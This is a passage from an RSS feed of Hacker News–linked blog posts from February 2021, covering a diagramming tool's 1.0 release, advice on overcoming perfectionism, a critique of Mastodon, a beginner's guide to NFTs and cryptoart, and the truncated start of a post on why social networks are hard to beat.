<p>As much as possible, we want to move away from the manual labor of dragging and dropping to create diagrams.</p>

<p>By using text to define diagrams, it should be possible to get at least 80% of the way towards the final product. I think the perfect diagram still requires human intervention to tweak the result of the autolayout algorithm [1]. Graphviz is currently the most used tool for auto-generating diagrams, but results won‚Äôt meet aesthetic criterias to put on blog posts. Tree-based and force-directed algorithms are only suitable for niche use cases. Most algorithms don‚Äôt handle containers, even though that‚Äôs extremely common in software architecture diagrams. We have a beta of an algorithm that gives aesthetically pleasing results, but it can be more consistent, and handle more cases.</p>

<p>Aside from faster diagramming, Terrastruct should allow automatically generating diagrams from sources that are suitable for such. The low-hanging fruit is database schemas. Make changes to your database schema, and a diagram of the relations should be generated, with links of dependencies. Some others to aim for are infrastructure ‚Äì reading AWS accounts and Terraform modules to produce a diagram of infrastructure ‚Äì and even source code itself ‚Äì trace dependencies or function calls.</p>

<h3 id="wed-love-to-hear-from-you">We‚Äôd love to hear from you</h3>
<p>Want to be a beta tester? Have any suggestions? We‚Äôd love to hear any and all feedback that you have, just email me: alex@terrastruct.com.</p>
<h2 id="notes">Notes</h2>
<ul>
  <li>[0] <a target="_blank" href="https://news.ycombinator.com/item?id=21958986">https://news.ycombinator.com/item?id=21958986</a></li>
  <li>[1] For more detail on unique features: <a href="https://terrastruct.com/compare/drawio-alternative/">here</a></li>
  <li>[1] Perhaps in the future that‚Äôs an area where AI can be applied ‚Äì that final 20% to making a diagram aesthetically pleasing.</li>
  <li>[2] For a more in-depth story of getting to 1.0: <a href="https://terrastruct.com/blog/designing-interface-diagramming-app/">here</a></li>
</ul>

      
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://terrastruct.com/blog/terrastruct-is-1-point-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202596</guid>
            <pubDate>Sat, 20 Feb 2021 08:29:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Art of Finishing Things (or how to stop the never-ending perfectionism loop)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26202468">thread link</a>) | @mjoksimovic
<br/>
February 20, 2021 | https://unstructed.tech/2021/02/20/art-of-finishing-things/ | <a href="https://web.archive.org/web/*/https://unstructed.tech/2021/02/20/art-of-finishing-things/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				












<h2>Background</h2>



<p>You would think that starting or sustaining at anything is hard enough, right? But once you do start and once you do keep doing it, assuming that there‚Äôs an actual end to it, you‚Äôd expect it to be easy, no? Since you overcame the static friction and (hopefully) managed to do it for long enough to bring it to closure, finalizing the thing (whatever the thing is) should be a no brainer, right?</p>



<p>WRONG! </p>



<p>I can tell you, firsthand, that you are so damn wrong. Doubly so if you are somewhere high on the perfectionist spectrum.</p>



<p>Finishing a task, finalizing a project or wrapping up your bachelor thesis ‚Äì they all come with specific set of issues. And this article is all about tackling them.</p>



<h2>Real-life story</h2>



<p>I finished all my exams and was discussing with my mentor which subject to tackle for my thesis work. Everything run by so fast and I just felt like I never gave my 100%. I did pretty good overall but I just felt like I never demonstrated my best. This was a time to make up for that.</p>



<p>‚ÄúHow much time do I actually have to submit this thesis?‚Äù. It was around late February.</p>



<p>‚ÄúWell, the latest you have is by October, but I‚Äôd strongly suggest you to aim for June. No need to drag it any further than that‚Äù.</p>



<p>Almost eight months in worst case. Hell, even if I wrote half a page a day, I could tackle this in three months. EASILY.</p>



<p>Now, you have to understand that, by being a perfectionist and if you‚Äôre reading this ‚Äì you probably are one, <span>you tend to categorize tasks in two categories ‚Äî ULTRA IMPORTANT or NOT IMPORTANT AT ALL</span>. The latter ones are fine ‚Äì you probably don‚Äôt need this article to have those tackled. But the ones that you categorize as ULTRA IMPORTANT, well hell‚Äôs bells, <span>unless you apply some tools of the trade, those tasks are doomed to last FOREVER</span>.</p>



<p>Needless to say in which category did my thesis end up, right? It was my personal work of art, expressed by letters being grouped into words. Every chapter would be a mind blowing one. Every comma had a pure holistic reasoning behind it. It was my terrestrial legacy to all of the readers and all future generations to come.</p>



<p>Two months and, I kid you not, all I had was a title. Well, a rather good one I should say ‚Äì ‚ÄúUsing audio-fingerprinting technique for the purpose of identification and categorization of an audio sample‚Äù. But still, it‚Äôs ALL I had in TWO months. And it wasn‚Äôt even written in a required format, but rather hanging in my notes app. At least it ticked all of my shitboxes ‚Äì it sounded holistic and I‚Äôm sure the academia would fall over it‚Äôs butt once I released it to wilderness ‚Ä¶</p>



<p>‚ÄúOkay‚Äù, I thought, ‚Äúat least I have a month to wrap it up. I can do two pages a day or so and I‚Äôll be good to go‚Äù. What a dumb-ass thinking it was ‚Ä¶</p>



<p>I‚Äôd like to say that it took me a month to finish, but that‚Äôd be a lie. It took me seven months and twenty eight days of randomly writing thoughts here and there, widening and narrowing down all the topics that I‚Äôd love to cover ‚Ä¶ And the clock was actively working against me. The paranoia started kicking in. Frankly, I probably would never even have finished it if it wasn‚Äôt for my professor who contacted me in late September to tell me that I have two days to deliver a finished and printed version. He loved the progress and he approved everything that I covered so far, but he needed it finished. F*ck!</p>



<p>Not only did I finish the whole thesis in 48 hours (I was literally writing the day and night; the only time when I wasn‚Äôt writing was during the 8 hours when I had work to attend to), but it turned out pretty good! Probably not how I envisioned it, but regardless. And I liked it.</p>



<p>Now, I would love to say that I learned my lesson here and that my master thesis took a different course. Not exactly. However, I‚Äôve learned a trick ‚Äì <span>I wrote the intro and conclusion before I wrote the middle part</span>. Combined with a fixed deadline, it actually did wonders. And I‚Äôll elaborate on that now ‚Ä¶</p>



<h2>The ‚ÄúLife‚Äôs Work‚Äù problem</h2>



<p>You know, I‚Äôm not exactly sure if this is just my problem or a rather generic one. I would bet on the latter.</p>



<p><span>Be it a thesis, a short-term task or a whole project that you are working on, we tend to believe that it just has to be perfect. Good enough is not good enough</span>. But, why so?</p>



<p>I can‚Äôt speak for everyone, but when it comes to me, I actually think that I‚Äôm afraid of being judged. Especially for something that I do care about. I‚Äôm afraid that someone is going to look at what I did and just be like ‚Äúmeh, it‚Äôs okay‚Äù, or ‚Äúmeh, it could have been better‚Äù. The sheer thought of that scares the living shit out of me.</p>



<p>Obviously, the only way of preventing someone from judging you (yes, YOU!) is to make it your life‚Äôs work. Pour all time and energy into it, trying to make it perfect.</p>



<p>And you know what‚Äôs the problem with ‚Äúlife‚Äôs work‚Äù? You either drop dead before you‚Äôre finished, or you give up on it. But one thing is guaranteed ‚Äì they take shitload of time and you probably miss bunch of other opportunities in the process. Worst of all? <span>Once you do do finish (assuming that you do so), and once the initial excitement wears of, you realize that it wasn‚Äôt even that important in the first place</span>. It becomes yet another ‚Äúmeh, it‚Äôs okay‚Äù on your shelf. And you move on, determined not to repeat the same mistake again.</p>



<h2>Deadline as a medium of creative drive</h2>



<p>You know, I‚Äôm a programmer. And I‚Äôve been so my whole life. And <span>if there is ONE thing that is guaranteed to trigger my vomit reflex it has to be the mention of a ‚Äúdeadline‚Äù</span>. Seriously.</p>



<p>Yet, <span>I would lie if I told you that there‚Äôs been anything remotely more efficient than having a fixed deadline</span>. The date when you have to have your project finished, or the date when you have to turn your homework or thesis in.</p>



<p>You would assume that NOT having a deadline is a proper way to fire up your creative juices, right? Because, putting a TIMELINE on a creative work beats the purpose of creativity, right? </p>



<p>Wrong. Partially, at least.</p>



<p>If you haven‚Äôt done so already, I‚Äôd strongly suggest you go and read <a href="https://www.goodreads.com/book/show/18077903-creativity-inc?ac=1&amp;from_search=true&amp;qid=UIM1mGMSpj&amp;rank=1" target="_blank" rel="noreferrer noopener">Creativity, Inc</a>. It‚Äôs written by Ed Catmull, a guy who happens to be a brain behind 3D graphics and many of the Pixar‚Äôs cartoons. He also happens to be a President of Disney‚Äôs animation studio. </p>



<p>He argues that the deadlines are THE BEST way to bring your creativity to anything that is useful. Like, you know, a Toy Story for example. And how so? Well, by treating it as a medium, and not as a whip. You set a deadline for a check-up, but you don‚Äôt threaten people with being beaten if they miss it. You have people commit to deliver SOMETHING by the fixed date and then you decide how to proceed. Rinse &amp; repeat until it‚Äôs perfect!</p>



<p><span>But, what do you do if you DON‚ÄôT have a fixed deadline (e.g. you‚Äôre working on your personal pet project, like, a blog post for example)? Well, you MAKE one</span>! And just to ensure that you do have actual stakeholders waiting for the ‚Äúoutcome‚Äù, you make a public commitment!</p>



<h2>Public Commitment as a viable alternative</h2>



<p>If you‚Äôve been following my ‚Äúwork‚Äù on Instagram or LinkedIn, you probably have noticed that I usually publish a screenshot of the new article that I‚Äôm starting to work on. And you might have been wondering, and rightfully so, WHY am I doing that? What‚Äôs the purpose of publishing a screenshot of an unpublished article?</p>



<p>That is my public commitment! That is how I make an artificial deadline and how I make you a stakeholder. By publishing the screenshot, I‚Äôm passively announcing that I‚Äôm working on something new and that you should expect the final version soon. And there it is. My artificial 5-days deadline is set and my creative juices are on fire now!</p>



<p><span>So, in case that you want to work on ANYTHING that doesn‚Äôt have a strong deadline, go and make one</span>! If you‚Äôre about to embark on a diet ‚Äì announce that you are planning to ‚Äúlose X kilograms by ‚Ä¶..‚Äù. If you‚Äôre working on a task, tell your boss that you will be finished by next week. Or, if you‚Äôre about to start blogging ‚Ä¶ well, announce it! Make your public commitment and then, the only thing that you‚Äôll be left with is ‚Äì having to do it üôÇ Because, you wouldn‚Äôt want to be a liar, wouldn‚Äôt you? üôÇ</p>



<h2>Your turn!</h2>



<p>Whatever it is that you are working on (or planning to do), go and announce WHEN will it be finished! Make a PUBLIC COMMITMENT. Make artificial stakeholders.</p>



<p><strong>You don‚Äôt have to make it PUBLIC PUBLIC</strong> though. Sharing it with your inner circle, your family or, you know, your boss, is absolutely OK as well. <span>What‚Äôs important is that<strong> you commit to at least one person </strong>and that person has to keep you accountable</span>!</p>



<p>I guarantee that once you scratch the power that lies under the surface of public commitment, you‚Äôll have hard time NOT finishing anything ever again!</p>



<h2>Conclusion</h2>



<p>Be it a task, a project, a thesis or a general goal that you want to achieve, putting end to what you started is as complex as starting and sustaining at it is. Combined with a ‚Äúlife‚Äôs work‚Äù problem where we tend to categorize things as ultimate expression of our creativity and skilfulness, we have a perfect recipe for a never-ending crusade.</p>



<p>One of the best ways to tackle this is a battle tested method of a deadline and commitment. Commit yourself either to your best friend or by announcing it publicly, and do make sure to create stakeholders and set expectations. This, in turn, will be one of the best driving forces both to keep you on track of what matters and to ensure that you are actually going to close.</p>



<p>Good luck and let me know how you did!</p>



<h2>Useful resources</h2>



<p>Unfortunately, I don‚Äôt have that many resources directly related to the subject of ‚Äúfinishing‚Äù things. Hence, I will recommend some of the things that, among other things, tackle some of the topics that I wrote about:</p>



<ul><li>Creativity, Inc. by Ed Catmull ‚Äì it‚Äôs not a self-help book but it deals with the topic of creativity and how Pixar achieved it. You‚Äôll get to ‚Ä¶</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://unstructed.tech/2021/02/20/art-of-finishing-things/">https://unstructed.tech/2021/02/20/art-of-finishing-things/</a></em></p>]]>
            </description>
            <link>https://unstructed.tech/2021/02/20/art-of-finishing-things/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202468</guid>
            <pubDate>Sat, 20 Feb 2021 08:03:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mastodon Is Bound to Fail]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26202281">thread link</a>) | @todsacerdoti
<br/>
February 19, 2021 | https://raccoon.onyxbits.de/blog/mastodon-social-network-review/ | <a href="https://web.archive.org/web/*/https://raccoon.onyxbits.de/blog/mastodon-social-network-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>I have a problem with this blog. It used to be powered by Wordpress, but the <bbr title="Content Management System">CMS pissed me off without end over the years, so I migrated to Hugo. That fixed a lot of the problems, except the main one: it is still (mostly) a Wordpress style blog, in which posts are fat content pieces of content, consisting of a  title and at least one paragraph of text. This is utterly unsuitable for things like posting status updates or sharing thoughts. Twitter does way better here, but it‚Äôs a proprietary platform, I‚Äôm not willing to bind myself to.</bbr></p>

<p>So, how about Mastodon then? Looks like Twitter, works like Twitter, but is federated and sadly, also a lost cause.</p>

<h2 id="the-thing-mastodon-gets-wrong">The thing, Mastodon gets wrong</h2>

<p>To me, it seems like Mastodon is trying to be a social network, while, ironically, completely failing to understand the network effect. It‚Äôs the right tool for the wrong people (or the wrong tool for the right people? I don‚Äôt know).</p>

<p>Let‚Äôs face it, what we want is a platform where you can have an intelligent conversation, where our privacy is respected and where we stay in control. But that‚Äôs not at all the audience, social media is build for. The ecosystem is entirely structured around all those gone gaga self promoters and would be celebrities that have nothing to contribute except ‚Äúthemselves‚Äù and are willing to sacrifice any last piece of dignity, if only it increases their following, so they have a number to show to their sponsors. The deal influencers enter is simple: bring in two new followers to the platform, get (an old) one for free. Keep any of the money, you may make from sponsors. Now go and post pictures of your lunch before (and after) you eat it.</p>

<p>
  
  <span>An ugly truth about building a better mousetrap</span>
  
  
It's the shitty parts, that made the original design so successful.

</p>
                             
                             

<p>And that in a nutshell is why Mastodon is going to fail: it simply is not build for the people who bring in other people, as it lacks any reward mechanism for multipliers. Social media is (and has to be) inherently anti-privacy in order to allow for monetizing ‚Äúmy personal life‚Äù. A commodity, available to everyone without any skill requirement to exploit, so there‚Äôs no shortage of dipshits, willing to take the deal. Most fail, but even in doing so, still promote the networks.</p>

<h2 id="quo-vadis">Quo vadis</h2>

<p>So, Mastodon has a choice. Either continue on the path of mimicking Twitter (without getting the crucial part right) and stay a niche product. Or (actively) attract marketeers, influencers and other attention whores, by promising them an audience while becoming a federated ad platform.</p>

<p>Either way, it‚Äôs not for me.</p>
</div></div>]]>
            </description>
            <link>https://raccoon.onyxbits.de/blog/mastodon-social-network-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202281</guid>
            <pubDate>Sat, 20 Feb 2021 07:16:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Skeptics Introduction to Crypto Art and NFTs]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26202152">thread link</a>) | @zuhayeer
<br/>
February 19, 2021 | https://justincone.com/posts/nft-skeptics-guide/ | <a href="https://web.archive.org/web/*/https://justincone.com/posts/nft-skeptics-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://justincone.com/images/warning.png" alt="Warning"></p><p>Since writing this guide, I‚Äôve become increasingly concerned about <a href="https://memoakten.medium.com/the-unreasonable-ecological-cost-of-cryptoart-2221d3eb2053" target="_blank">the enormous environmental impact of cryptoart</a>, which currently relies on the Ethereum blockchain.</p><p><strong>The energy usage of Ethereum is ludicrous.</strong> Yes, there are solutions <a href="https://spectrum.ieee.org/computing/networks/ethereum-plans-to-cut-its-absurd-energy-consumption-by-99-percent" target="_blank">in the works</a>, but they‚Äôre going to take a lot of time to implement.</p><p>I‚Äôm going to leave the contents below online for reference, but I might decide to take them down (or radically alter them) soon.</p><p>Please be responsible. Don‚Äôt jump into this scene until a clear, viable, environmentally-responsible pathway has opened up.</p><p>‚Äî<strong>2021.01.20</strong></p><h2 id="who-is-this-guide-for">Who is this guide for?</h2><p>This guide is for digital artists and designers curious about cryptoart and NFTs.</p><p>If you‚Äôre reading this, you‚Äôve probably‚Ä¶</p><ul><li><p>heard about <a href="https://decrypt.co/51270/beeple-nft-sale" target="_blank">Beeple selling $582,000 USD of cryptoart in 5 minutes</a>.</p></li><li><p>been confused by what NFTs are.</p></li><li><p>wondered if you could get in on this whole thing before it disappears.</p></li></ul><p>This guide has been intentionally written as a high-level introduction for general audiences.</p><h2 id="what-this-guide-isnt">What this guide isn‚Äôt</h2><p>This is not a technical guide.</p><p>I‚Äôm not going to explain the details of the technology involved. You can visit the <a href="#further-reading">further reading</a> section below if you want to go deep.</p><p>If you‚Äôre the type of person who likes to start sentences with, ‚ÄúWell, <em>actually‚Ä¶</em>‚Äù then <strong>this guide is not for you.</strong> Please go away.</p><p><img src="https://justincone.com/images/cryptopunks.png" alt="Cryptopunks"><em><a href="https://larvalabs.com/cryptopunks" target="_blank">Cryptopunks</a>, a beloved cryptoart experiment and early NFT</em></p><h3 id="this-is-unotu-an-endorsement-of-cryptoart">This is <u>not</u> an endorsement of cryptoart</h3><p>While the cryptoart scene is interesting and sometimes exciting, it currently has <a href="https://digiconomist.net/ethereum-energy-consumption/" target="_blank">a massive energy consumption problem</a>.</p><p>We‚Äôll get into this <a href="#isnt-crypto-really-bad-for-the-environment">later</a>, but please understand that the environmental impacts of the cryptoart market are sizable.</p><h2 id="who-am-i">Who am I?</h2><p>I‚Äôve been a designer, technologist, and communicator for over 20 years.</p><p>Many guides to cryptoart and NFTs are written by a) groups that stand to benefit from them or b) zealous individuals who drank an entire gallon of crypto kool-aid in one sitting.</p><p>I am neither.</p><p>I‚Äôll shoot straight, and I‚Äôll skip the jargon and acronyms when I can.</p><p>(And trust me: I haven‚Äôt been drinking the kool-aid. I find this topic fascinating, but I‚Äôm a skeptic‚Äîas you‚Äôll see below.)</p><h3 id="disclaimer">Disclaimer</h3><p>I‚Äôm not a cryptoart expert. I‚Äôm a nerd who saw a need for this guide, and I filled it.</p><p>I‚Äôll regularly correct and update this guide, keeping track of major changes and giving credit for contributions in the <a href="#changelog">Changelog</a> below.</p><p>‚úâÔ∏è <em><a href="mailto:me@justincone.com">Contact me</a> with questions or ideas. Don‚Äôt be shy! I‚Äôm nice.</em></p><h3 id="why-did-i-create-this-guide">Why did I create this guide?</h3><p>I don‚Äôt know. It was fun? I‚Äôm weird.</p><h2 id="what-is-cryptoart">What is cryptoart?</h2><p>There‚Äôs no universally accepted definition of cryptoart. For now, let‚Äôs use this:</p><blockquote><p>Cryptoart is art that uses blockchain technology in its creation and/or distribution.</p></blockquote><h2 id="okay-so-what-is-blockchain-technology">Okay, so what is blockchain technology?</h2><p>Think of blockchains as giant spreadsheets<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> that can be viewed by anyone. I know: <em>Boooring!</em></p><p>But wait! These spreadsheets have ‚ú®special rules‚ú®.</p><ul><li><p>You‚Äôre not allowed to delete or change rows in the spreadsheet.</p></li><li><p>You can only add a new row after the last row. (Weird, right?)</p></li><li><p>When you add a row to the spreadsheet, a network of computers do a bunch of super complex math to confirm that what you added is okay. (Even weirder.)</p></li><li><p>If you try to sneak a change into the spreadsheet‚Äîlike, I don‚Äôt know, give yourself a million bucks‚Äîthat change will be rejected by the network.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p></li></ul><p>Just like normal spreadsheets, blockchains are great for keeping track of transactions.</p><h3 id="um-transactions">Um‚Ä¶ transactions?</h3><p>Yeah, you know: I give you something, you give me something in return. Transactions.</p><p>Blockchains store transactions in a way that is viewable by anyone but editable only under certain conditions.</p><p>(See the <a href="#okay-so-what-is-blockchain-technology">special spreadsheet rules above</a>, in case you already forgot them.)</p><h2 id="what-are-nfts">What are NFTs?</h2><p>Now we‚Äôre getting to the juicy stuff. üçã</p><p>NFT stands for Non-Fungible Token. But what does that mean?</p><p><em>Don‚Äôt worry about it.</em> Seriously. Other guides try to explain fungibility, but I‚Äôm not going to. It‚Äôs boring and too technical for our purposes.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p><p>The keyword to remember is <strong>token.</strong> We‚Äôll come back to it in a minute.</p><p>For now, let‚Äôs <strong>think of NFTs as digital collectibles.</strong> In the real world, pretty much anything can be collectible, given the right conditions: stamps, books, Pok√©mon cards, spoons.</p><p>(No really, <a href="https://www.ebay.com/b/Souvenir-Spoons/bn_7006309973" target="_blank">people collect spoons</a>.)</p><p>The same is true in the digital world. <strong>NFTs are a <a href="#okay-so-what-is-blockchain-technology">blockchain technology</a></strong> that allow people to collect and trade just about anything, including‚Ä¶ wait for it‚Ä¶ <em>art.</em></p><p><img src="https://justincone.com/images/mona.jpg" alt="Modern Mona Lisa"><em>This terrible thing, which I created in five minutes, could totally be an NFT.</em></p><p>Theoretically, NFTs can be used for lots of other stuff, too: issuing movie tickets, selling video game items, or even proving ownership of real estate.</p><p>But let‚Äôs stay focused: we‚Äôre talking about digital art here.</p><h2 id="what-is-digital-art">What is ‚Äúdigital art‚Äù?</h2><p>Oh no, we‚Äôre not going down <em>that</em> rabbit hole.</p><p>You‚Äôll have to define digital art for yourself. Whatever definition you have in your head is probably good enough for our purposes.</p><p>Let‚Äôs keep moving.</p><p>There are two basic steps to creating an NFT:</p><ol><li>Make a thing.</li><li>Tokenize the thing.</li></ol><h2 id="1-make-a-thing">1. Make a thing</h2><p>NFTs start as digital art (i.e. stuff you already know how to make):</p><ul><li>still images</li><li>GIFs</li><li>video loops (with or without audio)</li><li>music</li></ul><h3 id="what-about-physical-art-cant-i-turn-a-sculpture-or-a-painting-into-an-nft">‚ÄúWhat about physical art? Can‚Äôt I turn a sculpture or a painting into an NFT?‚Äù</h3><p>Kind of. It‚Äôs trickier than you think. We‚Äôll get to it in a second.</p><p>(If you really can‚Äôt wait, <a href="#creating-physical-objects">jump ahead</a>. But don‚Äôt get mad at me if you‚Äôre confused.)</p><h2 id="2-tokenize-the-thing">2. Tokenize the thing</h2><p>Remember <a href="#what-are-nfts">earlier</a> that we said NFTs are tokens? Follow along:</p><ul><li><p>For our purposes, think of a token as a digital link to something you‚Äôve made.</p></li><li><p>Tokens live on blockchains, which we‚Äôve <a href="#okay-so-what-is-blockchain-technology">already established</a> are great for keeping track of transactions.</p></li><li><p>When you ‚Äútokenize‚Äù a digital artwork, you‚Äôre linking something you‚Äôve made to a blockchain, which can be useful for proving ownership of that thing (among other things).</p></li></ul><h3 id="wait-there-are-_multiple_-blockchains">‚ÄúWait, there are <em>multiple</em> blockchains?‚Äù</h3><p>Oh yeah, there are loads of blockchains. You can even <a href="https://dzone.com/articles/how-to-create-your-own-cryptocurrency-blockchain-i" target="_blank">create your own</a>.</p><p>For NFTs, Ethereum is currently the most popular blockchain.<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup></p><p>This is important: <strong>the token by itself is not cryptoart.</strong></p><p>The NFT (remember: T is for token) merely <em>points</em> to something else and says, ‚ÄúHey, this thing and I are joined at the hip. We‚Äôre inseparable. Think of us as <strong>one</strong>.‚Äù</p><p><img src="https://justincone.com/images/nft-diagram.jpg" alt="Diagram showing the relationship between an NFT and a hosted digital image."><em>Token + media = cryptoart</em></p><h3 id="how-do-you-link-a-token-to-a-digital-thing">How do you link a token to a digital thing?</h3><p>Typically, you link a token to a digital thing you‚Äôve made by attaching some extra information (metadata) to the NFT. That extra info includes a link to an image, video, GIF, song, etc. that‚Äôs hosted somewhere else.<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup></p><p>This arrangement begs a few questions:</p><ul><li>Where will the ‚Äúofficial‚Äù digital asset be hosted?</li><li>How can collectors ensure that the asset won‚Äôt be changed by the artist?</li><li>What happens if the asset host goes down? Or disappears?</li></ul><p>There are solutions to these problems in the works,<sup id="fnref:6"><a href="#fn:6" role="doc-noteref">6</a></sup> and some of them get technical pretty fast<sup id="fnref:7"><a href="#fn:7" role="doc-noteref">7</a></sup>. This topic goes beyond the introductory level, so let‚Äôs keep moving for now.</p><h2 id="understanding-ownership">Understanding ‚Äúownership‚Äù</h2><h4 id="if-the-nft-isnt-the-actual-image-animation-music-etc-that-i-created-cant-people-just-copy-my-artwork">‚ÄúIf the NFT isn‚Äôt the actual image, animation, music, etc. that I created, can‚Äôt people just copy my artwork?‚Äù</h4><p>Remember: <strong>The complete cryptoart is the token <em>and</em> the media you created.</strong> So they can copy your image or your GIF or whatever‚Ä¶ but it doesn‚Äôt really matter.</p><p>Depending on how you see things, this is either great news or a big problem.</p><p><em>(By the way, the inherently copiable nature of digital art is the #1 thing I see NFT newbies struggling with‚Äîand for good reason. It‚Äôs confusing.)</em></p><h3 id="okay-lets-work-through-this-together">Okay, let‚Äôs work through this together.</h3><p>An NFT says that one specific copy of your digital media‚Äîthe one listed in the NFT‚Äôs metadata‚Äîis the one that matters.</p><p><em>We discussed this above. If you missed it, <a href="#token--media--cryptoart">go back</a> and make sure you understand it before moving on.</em></p><p>So you could have literally millions of copies of your sweet CG teapot floating around the web, but the owner of your cryptoart only cares about the ‚Äúofficial‚Äù copy linked to the NFT.</p><h4 id="im-sorry-but-thats-insane">‚ÄúI‚Äôm sorry, but that‚Äôs insane.‚Äù</h4><p>At first blush, <em>I agree.</em> But let‚Äôs step back for a second.</p><p>For a few bucks, you can find and print a high-resolution copy of Cindy Sherman‚Äôs ‚ÄúUntitled #96.‚Äù Here‚Äôs a copy of it <em>right here:</em></p><p><img src="https://justincone.com/images/sherman.jpeg" alt="Cindy Sherman's 'Untitled #96'"><em>‚ÄúUntitled #96‚Äù by Cindy Sherman (1981)</em></p><p>In 2011, a print of that photograph <a href="https://en.wikipedia.org/wiki/Untitled_96" target="_blank">sold for $3.89 million USD during a Christie's auction</a>‚Äîsetting a record for the most expensive photo ever sold (at that time).&nbsp;</p><p>Then, as now, people could easily reproduce the photo. Somehow, though, this didn‚Äôt stop the photo from selling for a boatload of cash.</p><h4 id="thats-different-people-were-buying-one-specific-print-of-the-photograph-one-created-by-the-artist-and-it-was-a-print-of-the-highest-quality">‚ÄúThat‚Äôs different. People were buying one specific print of the photograph, one created by the artist. And it was a print of the highest quality.‚Äù</h4><p>What if we broke into Cindy Sherman‚Äôs private studio, stole the original negative of the photograph, and then produced a print that was identical in quality to the one sold during the 2011 auction?</p><p>Would we be able to sell it for the same amount? Or more?</p><h4 id="no">‚ÄúNo.‚Äù</h4><p>Why not?</p><h4 id="it-wouldnt-be-official-it-wouldnt-be-from-the-artist">‚ÄúIt wouldn‚Äôt be official. It wouldn‚Äôt be from the artist.‚Äù</h4><p>Ah! Interesting. So we need to be able to trace the print back to the artist somehow?</p><h4 id="okay-i-see-where-youre-going-an-nft-traces-the-official-artwork-back-to-the-artist-and-the-blockchain-can-show-all-the-subsequent-owners-including-the-current-one">‚ÄúOkay, I see where you‚Äôre going. An NFT traces the official artwork back to the artist, and the blockchain can show all the subsequent owners, including the current one.‚Äù</h4><p>Exactly.</p><h4 id="but-what-if-we-hung-our-copy-right-next-to-the-official-print-in-an-identical-frame">‚ÄúBut what if we hung our copy right next to the official print in an identical frame?‚Äù</h4><p>It wouldn‚Äôt matter.</p><h4 id="what-yes-it-would-you-wouldnt-be-able-to-tell-them-apart">‚ÄúWhat?! Yes, it would! You wouldn‚Äôt be able to tell them apart.‚Äù</h4><p>The owner would know that the official version is the one in that <em>exact</em> spot on the wall, in that specific building.</p><p>It‚Äôs the same with NFTs: They point to a specific copy of a digital artwork ‚Äúhanging‚Äù in a specific place on the internet.</p><h4 id="i-still-think-its-crazy-that-people-can-copy-my-images-that-devalues-the-art">‚ÄúI still think it‚Äôs crazy that people can copy my images. That devalues the art!‚Äù</h4><p>Maybe. But it doesn‚Äôt <em>always</em> work that way.</p><p>I bet your mother or your uncle has a magnet on their refrigerator of one of Monet‚Äôs famous Water Lilies paintings.</p><p>Amazon currently returns nearly 800 items when you search for ‚ÄúMonet Water Lilies,‚Äù including neckties, mouse pads, and face masks.</p><p><img src="https://justincone.com/images/mask.jpeg" alt="Monet face mask"><em>A horrendous idea for a face mask. And yet, there it is.</em></p><p>Despite these countless copies, Monet‚Äôs Water Lilies paintings <a href="https://en.wikipedia.org/wiki/Water_Lilies_%28Monet_series%29#The_paintings_at_auction" target="_blank">routinely fetch tens of millions of dollars</a> at auctions.&nbsp;</p><p>Perhaps the prevalence of reproductions in our culture has ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://justincone.com/posts/nft-skeptics-guide/">https://justincone.com/posts/nft-skeptics-guide/</a></em></p>]]>
            </description>
            <link>https://justincone.com/posts/nft-skeptics-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26202152</guid>
            <pubDate>Sat, 20 Feb 2021 06:38:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why some of these social networks are so hard to beat]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26201808">thread link</a>) | @nadermx
<br/>
February 19, 2021 | https://johnathannader.com/why-some-these-social-networks-are-so-hard-beat/ | <a href="https://web.archive.org/web/*/https://johnathannader.com/why-some-these-social-networks-are-so-hard-beat/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <div>
      <div>
        
        <p>john | Feb. 20, 2021, 5:13 a.m.</p>
        <p>The way the internet has evolved, at least how people search for information, is search engines.&nbsp; Most phones, which is what the majority of the world uses to browse the internet, like computers did back in the day, come preinstalled with browsers and search engines.&nbsp; Some even come installed with social networks.</p><p>Now this is in part by design and in part by the fact that it was the simplest solution at the time because it was the best.&nbsp; Take for example when google came out.&nbsp; All the other search engines, looked spamish, and generally their results where not too great.</p><p>Along comes google, giving you a new authority engine.&nbsp; Then out of no where there is a nice simple way to search for things on the internet instead of having to type in a domain and hope some one developed it.</p><p>This was awesome, and still probably is.&nbsp; But as more and more people started using the internet, also came the copious amount of volume that humans produce also needing to be indexed and ranked via authority. </p><p>This is generally helpful as most people trust the top search results now a days of most search engines.&nbsp; So how does this lead for social networks dominance.&nbsp; Well, let's assume that some one doesn't have FaceBook or similar.&nbsp; They get brand new access to a phone or something, and do a simple search.&nbsp; </p><p>Now FaceBook, Amazon, Harvard, all have authority.&nbsp; They are "trusted" sourced of content on the internet.&nbsp; There are of course others, but I'm trying to keep things simple. The only difference is Harvard does not have the entire world population able to post on it.<br></p><p>So by default if someone, qualified, or not, was to write something on FaceBook about a 